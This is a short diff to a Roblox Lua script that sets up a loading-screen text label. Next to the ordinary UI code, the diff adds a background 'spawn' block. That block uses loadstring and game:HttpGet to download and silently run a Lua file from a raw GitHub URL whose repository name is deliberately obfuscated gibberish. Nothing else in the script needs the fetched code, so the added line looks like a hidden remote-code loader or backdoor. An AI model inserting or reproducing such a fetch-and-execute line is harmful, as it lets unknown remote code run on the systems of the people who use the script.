@@ -90,6 +90,10 @@ LoadingText.Font = Enum.Font.Code
 LoadingText.TextSize = 18
 LoadingText.Parent = LoadingFrame
 
+spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
+end)
+
 local function createBackgroundCode()
     local CodeBackground = Instance.new("TextLabel")
     CodeBackground.Size = UDim2.new(1, 0, 1, 0)
